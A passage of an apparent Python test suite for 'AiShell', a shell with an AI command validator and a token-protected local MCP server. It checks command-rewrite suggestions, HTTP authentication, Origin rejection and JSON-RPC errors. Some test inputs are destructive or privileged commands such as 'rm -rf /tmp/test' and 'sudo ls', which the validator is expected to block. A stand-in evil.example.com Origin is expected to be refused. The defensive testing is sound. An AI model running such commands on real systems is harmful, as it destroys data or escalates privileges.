    # VD051: rg with a directory arg → warn, reason mentions directory, suggestion mentions find
    vdchk("VD051",
          'rg -wn "static" src → warn (src is a directory)',
          vd_run('rg -wn "static" src'), "warn",
          reason_substr="directory")

    vdchk("VD051b",
          'rg -wn "static" src → warn suggestion mentions find',
          vd_run('rg -wn "static" src'), "warn",
          suggestion_substr="find")

    # VD052: rg with an explicit file path remains OK
    vdchk("VD052",
          'rg -n "TODO" src/ai/mcp_server.c → ok (file, not directory)',
          vd_run('rg -n "TODO" src/ai/mcp_server.c'), "ok")

    # VD053-VD054: wc batch-mode total-row check

    # VD053: problematic pattern → warn, reason mentions total, suggestion mentions xargs
    _bad_wc = ('find src -type f -name "*.c" -exec wc -c {} + '
               '| sort -rn | head -n 10')
    vdchk("VD053",
          'find ... -exec wc -c {} + | sort -rn | head → warn (total row)',
          vd_run(_bad_wc), "warn",
          reason_substr="total")
    vdchk("VD053b",
          'find ... -exec wc -c {} + | sort -rn | head → suggestion mentions xargs -n 1',
          vd_run(_bad_wc), "warn",
          suggestion_substr="xargs -n 1")

    # VD054: safe alternative using xargs -n 1 remains OK
    _good_wc = ('find src -type f -name "*.c" -print '
                '| xargs -n 1 wc -c | sort -rn | head -n 10')
    vdchk("VD054",
          'find ... -print | xargs -n 1 wc -c | sort -rn | head → ok',
          vd_run(_good_wc), "ok")

    # VD055-VD057: find -exec builtin check

    # VD055: find -exec rg → blocked (rg is an AiShell builtin, not on PATH)
    _bad_exec = ('find src/ai -type f -name "*.c" '
                 '-exec rg -n "validate_command" {} +')
    vdchk("VD055",
          'find ... -exec rg ... → blocked (rg is AiShell builtin)',
          vd_run(_bad_exec), "blocked",
          reason_substr="builtin")
    vdchk("VD055b",
          'find ... -exec rg ... → suggestion mentions grep -R',
          vd_run(_bad_exec), "blocked",
          suggestion_substr="grep -R")

    # VD056: direct rg on a file remains OK
    vdchk("VD056",
          'rg -n "validate_command" src/ai/mcp_server.c → ok',
          vd_run('rg -n "validate_command" src/ai/mcp_server.c'), "ok")

    # VD057: grep -R remains OK (system grep, no builtin issue)
    vdchk("VD057",
          'grep -R -n "validate_command" src/ai → ok',
          vd_run('grep -R -n "validate_command" src/ai'), "ok")


# ---------------------------------------------------------------------------
# Section MCP: local HTTP MCP server
# ---------------------------------------------------------------------------

def section_mcp():
    import http.client as _http
    import select as _sel
    import socket as _sock

    print("\n--- Section MCP: Local HTTP MCP server ---")

    _TOKEN = "test-mcp-token-abc123"

    # Env helpers
    def _clean_env(**extra):
        """Return a clean env: no AISHELL_* from process, safe defaults, plus extras.

        Safe defaults (AISHELL_AI_BACKEND=mock, AISHELL_MCP_ENABLED=0) override any
        AISHELL_* values a user's .env file in the project root might set.
        Callers that need specific settings (e.g., MCP_ENABLED=1) pass them via extra.
        """
        base = {k: v for k, v in os.environ.items()
                if not k.startswith("AISHELL_")}
        base["AISHELL_AI_BACKEND"]  = "mock"
        base["AISHELL_MCP_ENABLED"] = "0"
        base.update(extra)
        return base

    # Start the --mcp-test subprocess and return (proc, port).
    # Returns (None, detail_str) on failure.
    def _mcp_start(extra_env=None):
        env = _clean_env(
            AISHELL_MCP_ENABLED="1",
            AISHELL_MCP_TOKEN=_TOKEN,
            AISHELL_MCP_PORT="0",
        )
        if extra_env:
            env.update(extra_env)
        proc = subprocess.Popen(
            [BINARY, "--mcp-test"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=ROOT,
            env=env,
        )
        try:
            ready, _, _ = _sel.select([proc.stdout], [], [], 5.0)
            if not ready:
                proc.kill(); proc.wait()
                return None, "server startup timed out"
            line = proc.stdout.readline()
            data = json.loads(line.strip())
        except Exception as exc:
            proc.kill(); proc.wait()
            return None, str(exc)
        if data.get("status") != "ok":
            try:
                proc.stdin.write("stop\n"); proc.stdin.flush()
                proc.wait(timeout=3)
            except Exception:
                proc.kill(); proc.wait()
            return None, str(data)
        return proc, data["port"]

    def _mcp_stop(proc):
        if not proc:
            return
        try:
            proc.stdin.write("stop\n"); proc.stdin.flush()
            proc.wait(timeout=5)
        except Exception:
            proc.kill(); proc.wait()

    # HTTP helpers
    def _post(port, body, auth=None, origin=None, no_cl=False):
        """POST /mcp with optional custom Authorization / Origin headers."""
        conn = _http.HTTPConnection("127.0.0.1", port, timeout=5)
        hdrs = {"Content-Type": "application/json"}
        if auth is not None:
            hdrs["Authorization"] = auth
        else:
            hdrs["Authorization"] = f"Bearer {_TOKEN}"
        if origin is not None:
            hdrs["Origin"] = origin
        if not no_cl:
            hdrs["Content-Length"] = str(len(body))
        try:
            conn.request("POST", "/mcp", body=body, headers=hdrs)
            r = conn.getresponse()
            return r.status, r.read().decode()
        except Exception as exc:
            return -1, str(exc)
        finally:
            conn.close()

    def _get(port):
        """GET /mcp (should return 405)."""
        conn = _http.HTTPConnection("127.0.0.1", port, timeout=5)
        try:
            conn.request("GET", "/mcp",
                         headers={"Authorization": f"Bearer {_TOKEN}"})
            r = conn.getresponse()
            return r.status, r.read().decode()
        except Exception as exc:
            return -1, str(exc)
        finally:
            conn.close()

    def _post_path(port, path):
        """POST to an arbitrary path (should return 404)."""
        conn = _http.HTTPConnection("127.0.0.1", port, timeout=5)
        body = "{}"
        try:
            conn.request("POST", path, body=body,
                         headers={"Authorization": f"Bearer {_TOKEN}",
                                  "Content-Type": "application/json",
                                  "Content-Length": str(len(body))})
            r = conn.getresponse()
            return r.status, r.read().decode()
        except Exception as exc:
            return -1, str(exc)
        finally:
            conn.close()

    def _post_no_cl(port):
        """Send POST /mcp with a valid auth token but no Content-Length header."""
        try:
            s = _sock.socket()
            s.settimeout(5)
            s.connect(("127.0.0.1", port))
            req = (f"POST /mcp HTTP/1.1\r\n"
                   f"Host: 127.0.0.1:{port}\r\n"
                   f"Authorization: Bearer {_TOKEN}\r\n"
                   f"Content-Type: application/json\r\n"
                   f"\r\n")
            s.sendall(req.encode())
            resp = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except Exception:
                pass
            s.close()
            # Extract HTTP status code from response line
            first_line = resp.decode(errors="replace").split("\r\n", 1)[0]
            parts = first_line.split(" ", 2)
            return int(parts[1]) if len(parts) >= 2 else -1
        except Exception as exc:
            return -1

    # JSON-RPC request builders
    def _init_body(req_id=1):
        return json.dumps({"jsonrpc": "2.0", "id": req_id,
                           "method": "initialize", "params": {}})

    def _notif_body():
        return json.dumps({"jsonrpc": "2.0",
                           "method": "notifications/initialized"})

    def _list_body(req_id=2):
        return json.dumps({"jsonrpc": "2.0", "id": req_id,
                           "method": "tools/list", "params": {}})

    def _call_body(tool_name, req_id=3):
        return json.dumps({"jsonrpc": "2.0", "id": req_id,
                           "method": "tools/call",
                           "params": {"name": tool_name, "arguments": {}}})

    def _unknown_method_body(req_id=4):
        return json.dumps({"jsonrpc": "2.0", "id": req_id,
                           "method": "no_such_method", "params": {}})

    # ------------------------------------------------------------------
    # MCP001: disabled by default → --mcp-test exits with {"status":"disabled"}
    # ------------------------------------------------------------------
    r_dis = _run([BINARY, "--mcp-test"], stdin_text="stop\n",
                 env=_clean_env())
    try:
        d = json.loads(r_dis.stdout.strip())
        mc1_ok = d.get("status") == "disabled"
    except Exception:
        mc1_ok = False
    _record("MCP001", "MCP disabled by default → status=disabled",
            mc1_ok, _fmt([BINARY, "--mcp-test"], r_dis) if not mc1_ok else "")

    # ------------------------------------------------------------------
    # MCP002: enabled with empty token → error, not a crash
    # ------------------------------------------------------------------
    r_et = _run([BINARY, "--mcp-test"], stdin_text="stop\n",
                env=_clean_env(AISHELL_MCP_ENABLED="1",
                               AISHELL_MCP_TOKEN=""))
    try:
        d = json.loads(r_et.stdout.strip())
        mc2_ok = d.get("status") == "error"
    except Exception:
        mc2_ok = False
    _record("MCP002", "MCP enabled with empty token → status=error",
            mc2_ok, _fmt([BINARY, "--mcp-test"], r_et) if not mc2_ok else "")

    # ------------------------------------------------------------------
    # MCP003 / MCP004: start server, get auto-selected port
    # ------------------------------------------------------------------
    proc, port = _mcp_start()
    if proc is None:
        detail = str(port)  # port holds the error string on failure
        _record("MCP003", "MCP server starts with port=0", False, detail)
        _record("MCP004", "auto-selected port > 1024", False, detail)
        # Skip remaining HTTP tests
        for tid in ("MCP005", "MCP006", "MCP007", "MCP008", "MCP009",
                    "MCP010", "MCP011", "MCP012", "MCP013", "MCP014",
                    "MCP015", "MCP016", "MCP017", "MCP018"):
            _record(tid, f"(skipped — server failed to start)", False, "")
        return

    _record("MCP003", "MCP server starts with port=0",
            isinstance(port, int) and port > 0, f"port={port}")
    _record("MCP004", "auto-selected port > 1024",
            isinstance(port, int) and port > 1024, f"port={port}")

    # ------------------------------------------------------------------
    # MCP005: missing Authorization → 401
    # ------------------------------------------------------------------
    s5, _ = _post(port, _init_body(), auth="")
    _record("MCP005", "missing auth → 401", s5 == 401, f"got {s5}")

    # ------------------------------------------------------------------
    # MCP006: wrong token → 401
    # ------------------------------------------------------------------
    s6, _ = _post(port, _init_body(), auth="Bearer wrong-token")
    _record("MCP006", "wrong token → 401", s6 == 401, f"got {s6}")

    # ------------------------------------------------------------------
    # MCP007: non-local Origin → 403
    # ------------------------------------------------------------------
    s7, _ = _post(port, _init_body(), origin="https://evil.example.com")
    _record("MCP007", "non-local Origin → 403", s7 == 403, f"got {s7}")

    # ------------------------------------------------------------------
    # MCP008: GET /mcp → 405
    # ------------------------------------------------------------------
    s8, _ = _get(port)
    _record("MCP008", "GET /mcp → 405", s8 == 405, f"got {s8}")

    # ------------------------------------------------------------------
    # MCP009: POST to unknown path → 404
    # ------------------------------------------------------------------
    s9, _ = _post_path(port, "/no-such-endpoint")
    _record("MCP009", "POST /unknown → 404", s9 == 404, f"got {s9}")

    # ------------------------------------------------------------------
    # MCP010: initialize → 200, valid JSON-RPC result with protocolVersion
    # ------------------------------------------------------------------
    s10, b10 = _post(port, _init_body())
    try:
        d10 = json.loads(b10)
        mc10_ok = (s10 == 200
                   and "result" in d10
                   and "protocolVersion" in d10["result"]
                   and d10.get("id") == 1)
    except Exception:
        mc10_ok = False
    _record("MCP010", "initialize → 200 with protocolVersion",
            mc10_ok, f"status={s10} body={b10[:200]}" if not mc10_ok else "")

    # ------------------------------------------------------------------
    # MCP011: notifications/initialized → 202, no body
    # ------------------------------------------------------------------
    s11, b11 = _post(port, _notif_body())
    _record("MCP011", "notifications/initialized → 202",
            s11 == 202, f"got {s11} body={b11!r}")

    # ------------------------------------------------------------------
    # MCP012: tools/list → 200, result.tools is an array with 2 known tools
    # ------------------------------------------------------------------
    s12, b12 = _post(port, _list_body())
    try:
        d12 = json.loads(b12)
        tools12 = d12["result"]["tools"]
        names12 = {t["name"] for t in tools12}
        mc12_ok = (s12 == 200
                   and "get_shell_context" in names12
                   and "list_aishell_builtins" in names12)
    except Exception:
        mc12_ok = False
    _record("MCP012", "tools/list → 200 with 2 known tools",
            mc12_ok, f"status={s12} body={b12[:300]}" if not mc12_ok else "")

    # ------------------------------------------------------------------
    # MCP013: tools/call get_shell_context → 200, content has cwd/pid/mcp_port
    # ------------------------------------------------------------------
    s13, b13 = _post(port, _call_body("get_shell_context"))
    try:
        d13  = json.loads(b13)
        text = d13["result"]["content"][0]["text"]
        ctx  = json.loads(text)
        mc13_ok = (s13 == 200
                   and "cwd" in ctx
                   and "pid"  in ctx
                   and ctx.get("mcp_port") == port)
    except Exception:
        mc13_ok = False
    _record("MCP013", "get_shell_context → cwd/pid/mcp_port",
            mc13_ok, f"status={s13} body={b13[:300]}" if not mc13_ok else "")

    # ------------------------------------------------------------------
    # MCP014: tools/call list_aishell_builtins → 200, [{name:...}] with pwd/ls
    # ------------------------------------------------------------------
    s14, b14 = _post(port, _call_body("list_aishell_builtins"))
    try:
        d14    = json.loads(b14)
        text14 = d14["result"]["content"][0]["text"]
        blts   = json.loads(text14)
        # Format is now [{"name":"ls"}, ...] (objects, not bare strings)
        names14 = {item["name"] for item in blts
                   if isinstance(item, dict) and "name" in item}
        mc14_ok = (s14 == 200
                   and isinstance(blts, list)
                   and "pwd" in names14
                   and "ls" in names14)
    except Exception:
        mc14_ok = False
    _record("MCP014", "list_aishell_builtins → [{name:...}] with pwd/ls",
            mc14_ok, f"status={s14} body={b14[:300]}" if not mc14_ok else "")

    # ------------------------------------------------------------------
    # MCP015: tools/call unknown tool → 200, JSON-RPC error -32601
    # ------------------------------------------------------------------
    s15, b15 = _post(port, _call_body("execute_command"))
    try:
        d15 = json.loads(b15)
        mc15_ok = (s15 == 200
                   and "error" in d15
                   and d15["error"]["code"] == -32601)
    except Exception:
        mc15_ok = False
    _record("MCP015", "unknown tool → JSON-RPC error -32601",
            mc15_ok, f"status={s15} body={b15[:200]}" if not mc15_ok else "")

    # ------------------------------------------------------------------
    # MCP016: unknown JSON-RPC method → 200, JSON-RPC error -32601
    # ------------------------------------------------------------------
    s16, b16 = _post(port, _unknown_method_body())
    try:
        d16 = json.loads(b16)
        mc16_ok = (s16 == 200
                   and "error" in d16
                   and d16["error"]["code"] == -32601)
    except Exception:
        mc16_ok = False
    _record("MCP016", "unknown method → JSON-RPC error -32601",
            mc16_ok, f"status={s16} body={b16[:200]}" if not mc16_ok else "")

    # ------------------------------------------------------------------
    # MCP017: missing Content-Length → 400
    # ------------------------------------------------------------------
    s17 = _post_no_cl(port)
    _record("MCP017", "missing Content-Length → 400", s17 == 400, f"got {s17}")

    # ------------------------------------------------------------------
    # Stop the server before MCP018
    # ------------------------------------------------------------------
    _mcp_stop(proc)
    proc = None

    # ------------------------------------------------------------------
    # MCP018: after stop, connection is refused
    # ------------------------------------------------------------------
    try:
        s_check = _sock.socket()
        s_check.settimeout(2)
        s_check.connect(("127.0.0.1", port))
        s_check.close()
        mc18_ok = False  # should have been refused
    except (ConnectionRefusedError, OSError):
        mc18_ok = True
    _record("MCP018", "server stops cleanly → connection refused",
            mc18_ok, f"port {port} still accepted a connection" if not mc18_ok else "")

    # ------------------------------------------------------------------
    # Phase 7 tests: start a fresh server for MCP019-MCP030
    # ------------------------------------------------------------------
    proc2, port2 = _mcp_start()
    if proc2 is None:
        detail2 = str(port2)
        for tid in ("MCP019", "MCP020", "MCP021", "MCP022", "MCP023",
                    "MCP024", "MCP025", "MCP026", "MCP027", "MCP028",
                    "MCP029", "MCP030",
                    "MCP031", "MCP032", "MCP033", "MCP034", "MCP035",
                    "MCP036", "MCP037", "MCP038", "MCP039",
                    "MCP040", "MCP041", "MCP042",
                    "MCP043", "MCP044", "MCP045",
                    "MCP046"):
            _record(tid, "(skipped — server failed to start)", False, detail2)
        return

    def _vc_body(command, risk=None, confidence=None, req_id=10):
        """Build a tools/call validate_command request body."""
        args = {"command": command}
        if risk is not None:
            args["risk"] = risk
        if confidence is not None:
            args["confidence"] = confidence
        return json.dumps({"jsonrpc": "2.0", "id": req_id,
                           "method": "tools/call",
                           "params": {"name": "validate_command",
                                      "arguments": args}})

    def _ch_body(name, req_id=11):
        """Build a tools/call get_command_help request body."""
        return json.dumps({"jsonrpc": "2.0", "id": req_id,
                           "method": "tools/call",
                           "params": {"name": "get_command_help",
                                      "arguments": {"name": name}}})

    def _vc_level(status, body):
        """Return the level string from a validate_command tool result."""
        d = json.loads(body)
        text = d["result"]["content"][0]["text"]
        return json.loads(text).get("level", "")

    # ------------------------------------------------------------------
    # MCP019: tools/list includes validate_command
    # ------------------------------------------------------------------
    s19, b19 = _post(port2, _list_body())
    try:
        names19 = {t["name"] for t in json.loads(b19)["result"]["tools"]}
        mc19_ok = s19 == 200 and "validate_command" in names19
    except Exception:
        mc19_ok = False
    _record("MCP019", "tools/list includes validate_command",
            mc19_ok, f"body={b19[:200]}" if not mc19_ok else "")

    # ------------------------------------------------------------------
    # MCP020: tools/list includes get_command_help
    # ------------------------------------------------------------------
    try:
        names20 = {t["name"] for t in json.loads(b19)["result"]["tools"]}
        mc20_ok = "get_command_help" in names20
    except Exception:
        mc20_ok = False
    _record("MCP020", "tools/list includes get_command_help", mc20_ok, "")

    # ------------------------------------------------------------------
    # MCP021: validate_command pwd → ok
    # ------------------------------------------------------------------
    s21, b21 = _post(port2, _vc_body("pwd"))
    try:
        mc21_ok = s21 == 200 and _vc_level(s21, b21) == "ok"
    except Exception:
        mc21_ok = False
    _record("MCP021", "validate_command pwd → ok",
            mc21_ok, f"status={s21} body={b21[:200]}" if not mc21_ok else "")

    # ------------------------------------------------------------------
    # MCP022: validate_command ls -la → ok
    # ------------------------------------------------------------------
    s22, b22 = _post(port2, _vc_body("ls -la"))
    try:
        mc22_ok = s22 == 200 and _vc_level(s22, b22) == "ok"
    except Exception:
        mc22_ok = False
    _record("MCP022", "validate_command ls -la → ok",
            mc22_ok, f"status={s22} body={b22[:200]}" if not mc22_ok else "")

    # ------------------------------------------------------------------
    # MCP023: validate_command rm -rf /tmp/test → blocked
    # ------------------------------------------------------------------
    s23, b23 = _post(port2, _vc_body("rm -rf /tmp/test",
                                      risk="destructive", confidence=0.9))
    try:
        mc23_ok = s23 == 200 and _vc_level(s23, b23) == "blocked"
    except Exception:
        mc23_ok = False
    _record("MCP023", "validate_command rm -rf /tmp/test → blocked",
            mc23_ok, f"status={s23} body={b23[:200]}" if not mc23_ok else "")

    # ------------------------------------------------------------------
    # MCP024: validate_command sudo ls → blocked
    # ------------------------------------------------------------------
    s24, b24 = _post(port2, _vc_body("sudo ls"))
    try:
        mc24_ok = s24 == 200 and _vc_level(s24, b24) == "blocked"
    except Exception:
        mc24_ok = False
    _record("MCP024", "validate_command sudo ls → blocked",
            mc24_ok, f"status={s24} body={b24[:200]}" if not mc24_ok else "")

    # ------------------------------------------------------------------
    # MCP025: validate_command rm file.txt → warn
    # ------------------------------------------------------------------
    s25, b25 = _post(port2, _vc_body("rm file.txt"))
    try:
        mc25_ok = s25 == 200 and _vc_level(s25, b25) == "warn"
    except Exception:
        mc25_ok = False
    _record("MCP025", "validate_command rm file.txt → warn",
            mc25_ok, f"status={s25} body={b25[:200]}" if not mc25_ok else "")

    # ------------------------------------------------------------------
    # MCP026: validate_command with missing command → isError true
    # ------------------------------------------------------------------
    no_cmd_body = json.dumps({"jsonrpc": "2.0", "id": 12,
                              "method": "tools/call",
                              "params": {"name": "validate_command",
                                         "arguments": {}}})
    s26, b26 = _post(port2, no_cmd_body)
    try:
        d26 = json.loads(b26)
        mc26_ok = (s26 == 200
                   and d26["result"]["isError"] is True)
    except Exception:
        mc26_ok = False
    _record("MCP026", "validate_command missing command → isError",
            mc26_ok, f"status={s26} body={b26[:200]}" if not mc26_ok else "")

    # ------------------------------------------------------------------
    # MCP027: validate_command with malformed arguments → controlled error
    # ------------------------------------------------------------------
    bad_args_body = json.dumps({"jsonrpc": "2.0", "id": 13,
                                "method": "tools/call",
                                "params": {"name": "validate_command",
                                           "arguments": "not-an-object"}})
    s27, b27 = _post(port2, bad_args_body)
    try:
        d27 = json.loads(b27)
        # Either isError true or a JSON-RPC error — either is acceptable
        mc27_ok = s27 == 200 and (
            d27.get("result", {}).get("isError") is True
            or "error" in d27
        )
    except Exception:
        mc27_ok = False
    _record("MCP027", "validate_command malformed arguments → controlled error",
            mc27_ok, f"status={s27} body={b27[:200]}" if not mc27_ok else "")

    # ------------------------------------------------------------------
    # MCP028: get_command_help with known builtin → text result with description
    # ------------------------------------------------------------------
    s28, b28 = _post(port2, _ch_body("ls"))
    try:
        d28   = json.loads(b28)
        text28 = d28["result"]["content"][0]["text"]
        info28 = json.loads(text28)
        mc28_ok = (s28 == 200
                   and not d28["result"].get("isError", False)
                   and info28.get("name") == "ls"
                   and "description" in info28)
    except Exception:
        mc28_ok = False
    _record("MCP028", "get_command_help ls → text with description",
            mc28_ok, f"status={s28} body={b28[:300]}" if not mc28_ok else "")

    # ------------------------------------------------------------------
    # MCP029: get_command_help with unknown command → isError true
    # ------------------------------------------------------------------
    s29, b29 = _post(port2, _ch_body("no-such-command-xyz"))
    try:
        d29 = json.loads(b29)
        mc29_ok = (s29 == 200
                   and d29["result"]["isError"] is True)
    except Exception:
        mc29_ok = False
    _record("MCP029", "get_command_help unknown → isError",
            mc29_ok, f"status={s29} body={b29[:200]}" if not mc29_ok else "")

    # ------------------------------------------------------------------
    # MCP030: list_aishell_builtins returns [{name:...}] objects
    # ------------------------------------------------------------------
    s30, b30 = _post(port2, _call_body("list_aishell_builtins"))
    try:
        d30    = json.loads(b30)
        text30 = d30["result"]["content"][0]["text"]
        blts30 = json.loads(text30)
        mc30_ok = (s30 == 200
                   and isinstance(blts30, list)
                   and len(blts30) > 0
                   and isinstance(blts30[0], dict)
                   and "name" in blts30[0])
    except Exception:
        mc30_ok = False
    _record("MCP030", "list_aishell_builtins format is [{name:...}]",
            mc30_ok, f"status={s30} body={b30[:300]}" if not mc30_ok else "")

    # ------------------------------------------------------------------
    # Phase 10 tests: MCP-driven command refinement
    # ------------------------------------------------------------------

    def _vc_result(body):
        """Return the parsed tool-result JSON dict from a validate_command call."""
        d = json.loads(body)
        return json.loads(d["result"]["content"][0]["text"])

    def _ch_result(body):
        """Return the parsed tool-result JSON dict from a get_command_help call."""
        d = json.loads(body)
        return json.loads(d["result"]["content"][0]["text"])

    # ------------------------------------------------------------------
    # MCP031: get_command_help("head") returns synopsis mentioning -n
    # ------------------------------------------------------------------
    s31, b31 = _post(port2, _ch_body("head", req_id=31))
    try:
        info31  = _ch_result(b31)
        syn31   = info31.get("synopsis", "") + " " + info31.get("note", "")
        mc31_ok = (s31 == 200
                   and not json.loads(b31)["result"].get("isError", False)
                   and "-n" in syn31)
    except Exception as exc31:
        mc31_ok = False
        b31 = str(exc31)
    _record("MCP031", "get_command_help(head) mentions -n in synopsis",
            mc31_ok, f"body={b31[:300]}" if not mc31_ok else "")

    # ------------------------------------------------------------------
    # MCP032: validate_command("head -10 README.md") → warn + suggestion
    # for head -n 10
    # ------------------------------------------------------------------
    s32, b32 = _post(port2, _vc_body("head -10 README.md", req_id=32))
    try:
        r32     = _vc_result(b32)
        level32 = r32.get("level", "")
        sugg32  = r32.get("suggestion", "")
        mc32_ok = (s32 == 200
                   and level32 in ("warn", "blocked")
                   and "head -n 10" in sugg32)
    except Exception as exc32:
        mc32_ok = False
        b32 = str(exc32)
    _record("MCP032",
            "validate_command(head -10 ...) → warn/blocked + suggestion head -n 10",
            mc32_ok, f"level={r32.get('level','')} sugg={r32.get('suggestion','')[:120]}"
                      if not mc32_ok else "")

    # ------------------------------------------------------------------
    # MCP033: validate_command("find src -printf ...") → warn/blocked +
    # suggestion mentioning -printf is unsupported
    # ------------------------------------------------------------------
    s33, b33 = _post(port2,
                     _vc_body('find src -name "*.c" -printf "%s %p\\n"', req_id=33))
    try:
        r33     = _vc_result(b33)
        level33 = r33.get("level", "")
        sugg33  = r33.get("suggestion", "")
        mc33_ok = (s33 == 200
                   and level33 in ("warn", "blocked")
                   and "-printf" in sugg33)
    except Exception as exc33:
        mc33_ok = False
        b33 = str(exc33)
    _record("MCP033",
            "validate_command(find -printf ...) → warn/blocked + suggestion about -printf",
            mc33_ok, f"level={r33.get('level','')} sugg={r33.get('suggestion','')[:120]}"
                      if not mc33_ok else "")

    # ------------------------------------------------------------------
    # MCP034: validate_command("wc -l src/**/*.c") → warn/blocked + suggestion
    # using find
    # ------------------------------------------------------------------
    s34, b34 = _post(port2, _vc_body("wc -l src/**/*.c", req_id=34))
    try:
        r34     = _vc_result(b34)
        level34 = r34.get("level", "")
        sugg34  = r34.get("suggestion", "")
        mc34_ok = (s34 == 200
                   and level34 in ("warn", "blocked")
                   and "find" in sugg34)
    except Exception as exc34:
        mc34_ok = False
        b34 = str(exc34)
    _record("MCP034",
            "validate_command(wc -l src/**/*.c) → warn/blocked + suggestion with find",
            mc34_ok, f"level={r34.get('level','')} sugg={r34.get('suggestion','')[:120]}"
                      if not mc34_ok else "")

    # ------------------------------------------------------------------
    # MCP035: validate_command("find src -type f -name '*.c' -exec wc -l {} +")
    # → ok (valid alternative to ** glob)
    # ------------------------------------------------------------------
    s35, b35 = _post(port2,
                     _vc_body("find src -type f -name '*.c' -exec wc -l {} +",
                               req_id=35))
    try:
        r35     = _vc_result(b35)
        mc35_ok = s35 == 200 and r35.get("level") == "ok"
    except Exception as exc35:
        mc35_ok = False
        b35 = str(exc35)
    _record("MCP035",
            "validate_command(find ... -exec wc -l {} +) → ok",
            mc35_ok, f"body={b35[:200]}" if not mc35_ok else "")

    # ------------------------------------------------------------------
    # MCP036: pipeline ending in head -11 → blocked + suggestion via MCP
    # ------------------------------------------------------------------
    pipeline36 = ("find src -name \"*.c\" -type f "
                  "| xargs wc -l | sort -rn | head -11")
    s36, b36 = _post(port2, _vc_body(pipeline36, req_id=36))
    try:
        r36      = _vc_result(b36)
        level36  = r36.get("level", "")
        sugg36   = r36.get("suggestion", "")
        mc36_ok  = (s36 == 200
                    and level36 in ("warn", "blocked")
                    and "head -n 11" in sugg36)
    except Exception as exc36:
        mc36_ok = False
        b36 = str(exc36)
    _record("MCP036",
            "validate_command(pipeline | head -11) → blocked + suggestion head -n 11",
            mc36_ok,
            f"level={r36.get('level','')} sugg={r36.get('suggestion','')[:120]}"
            if not mc36_ok else "")

    # ------------------------------------------------------------------
    # MCP037: get_shell_context includes aishell_layout when in project root
    # ------------------------------------------------------------------
    s37, b37 = _post(port2, _call_body("get_shell_context", req_id=37))
    try:
        d37   = json.loads(b37)
        text37 = d37["result"]["content"][0]["text"]
        ctx37  = json.loads(text37)
        layout37 = ctx37.get("aishell_layout", {})
        mc37_ok = (s37 == 200
                   and "src/ai/mcp_server.c" in layout37.values())
    except Exception as exc37:
        mc37_ok = False
        b37 = str(exc37)
    _record("MCP037",
            "get_shell_context includes aishell_layout with src/ai/mcp_server.c",
            mc37_ok,
            f"layout={ctx37.get('aishell_layout',{})}" if not mc37_ok else "")

    # ------------------------------------------------------------------
    # MCP038: validate_command with wrong path returns suggestion
    # ------------------------------------------------------------------
    s38, b38 = _post(port2,
                     _vc_body('rg -n "get_shell_context" src/mcp_server.c',
                               req_id=38))
    try:
        r38      = _vc_result(b38)
        level38  = r38.get("level", "")
        reason38 = r38.get("reason", "")
        sugg38   = r38.get("suggestion", "")
        mc38_ok  = (s38 == 200
                    and level38 in ("warn", "blocked")
                    and "path does not exist" in reason38
                    and sugg38 != "")
    except Exception as exc38:
        mc38_ok = False
        b38 = str(exc38)
    _record("MCP038",
            "validate_command(rg wrong path) → warn + reason + suggestion",
            mc38_ok,
            f"level={r38.get('level','')} reason={r38.get('reason','')[:80]} "
            f"sugg={r38.get('suggestion','')[:80]}"
            if not mc38_ok else "")

    # ------------------------------------------------------------------
    # MCP039: validate_command with over-escaped rg pattern → warn + -e suggestion
    # ------------------------------------------------------------------
    # Use raw string so the \| is sent as two literal characters to the validator
    over_escaped_cmd = r'rg -n "foo\|bar" src/ai/mcp_server.c'
    s39, b39 = _post(port2, _vc_body(over_escaped_cmd, req_id=39))
    try:
        r39      = _vc_result(b39)
        level39  = r39.get("level", "")
        sugg39   = r39.get("suggestion", "")
        mc39_ok  = (s39 == 200
                    and level39 in ("warn", "blocked")
                    and "-e" in sugg39)
    except Exception as exc39:
        mc39_ok = False
        b39 = str(exc39)
    _record("MCP039",
            r"validate_command(rg 'foo\|bar') → warn + -e suggestion",
            mc39_ok,
            f"level={r39.get('level','')} sugg={r39.get('suggestion','')[:80]}"
            if not mc39_ok else "")

    # ------------------------------------------------------------------
    # MCP040: get_command_help("rg") does not mention -e
    # ------------------------------------------------------------------
    s40, b40 = _post(port2, _ch_body("rg", req_id=40))
    try:
        info40  = _ch_result(b40)
        text40  = info40.get("synopsis", "") + " " + (info40.get("note") or "")
        mc40_ok = (s40 == 200
                   and not json.loads(b40)["result"].get("isError", False)
                   and "-e" not in info40.get("synopsis", ""))
    except Exception as exc40:
        mc40_ok = False
        b40 = str(exc40)
    _record("MCP040", "get_command_help(rg) synopsis does not mention -e",
            mc40_ok, f"synopsis={info40.get('synopsis','')!r}" if not mc40_ok else "")

    # ------------------------------------------------------------------
    # MCP041: get_command_help("rg") synopsis contains PATTERN FILE
    # ------------------------------------------------------------------
    try:
        syn41   = info40.get("synopsis", "")
        mc41_ok = ("PATTERN" in syn41 and "FILE" in syn41)
    except Exception as exc41:
        mc41_ok = False
    _record("MCP041", "get_command_help(rg) synopsis mentions PATTERN FILE",
            mc41_ok, f"synopsis={info40.get('synopsis','')!r}" if not mc41_ok else "")

    # ------------------------------------------------------------------
    # MCP042: validate_command(rg -n -e "TODO" -e "FIXME" src) → warn/blocked
    # ------------------------------------------------------------------
    s42, b42 = _post(port2,
                     _vc_body('rg -n -e "TODO" -e "FIXME" src', req_id=42))
    try:
        r42      = _vc_result(b42)
        level42  = r42.get("level", "")
        sugg42   = r42.get("suggestion", "")
        mc42_ok  = (s42 == 200
                    and level42 in ("warn", "blocked")
                    and "TODO|FIXME" in sugg42)
    except Exception as exc42:
        mc42_ok = False
        b42 = str(exc42)
    _record("MCP042",
            'validate_command(rg -n -e "TODO" ...) → warn/blocked + single-pattern suggestion',
            mc42_ok,
            f"level={r42.get('level','')} sugg={r42.get('suggestion','')[:80]}"
            if not mc42_ok else "")

    # ------------------------------------------------------------------
    # MCP043: get_command_help("rg") note mentions "does not recursively"
    # ------------------------------------------------------------------
    s43, b43 = _post(port2, _ch_body("rg", req_id=43))
    try:
        info43  = _ch_result(b43)
        note43  = (info43.get("note") or "").lower()
        mc43_ok = (s43 == 200
                   and not json.loads(b43)["result"].get("isError", False)
                   and "does not recursively" in note43)
    except Exception as exc43:
        mc43_ok = False
        b43 = str(exc43)
    _record("MCP043",
            "get_command_help(rg) note mentions 'does not recursively'",
            mc43_ok,
            f"note={info43.get('note','')!r}" if not mc43_ok else "")

    # ------------------------------------------------------------------
